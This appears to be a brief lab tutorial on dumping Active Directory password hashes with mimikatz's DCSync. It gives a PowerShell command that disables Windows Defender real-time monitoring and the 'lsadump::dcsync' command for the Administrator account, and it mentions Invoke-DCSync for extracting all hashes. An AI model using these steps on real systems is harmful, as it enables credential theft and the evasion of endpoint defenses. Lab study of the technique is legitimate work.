Goal: retrieve password hashes from all user accounts on a domain controller using the mimikatz DCSync function

Warning：Only do this in a lab environment.

mimikatz implemented a tool called DCSync, this allows mimikatz to impersonate a Domain Controller and attempt to retrieve all password hashes from another domain controller.

You may need to disable Windows Defender

Open up PowerShell as an administrator and type

$ Set-MpPreference -DisableRealtimeMonitoring $true

Start mimikatz

$ lsadump::dcsync /domain:test.local /user:Administrator

Now you have the password hash from that user

This required that you have Administrator access, specifically the Get-Replication-Changes-All Common Name attribute

Can use the Invoke-DCSync module to extract all hashes.
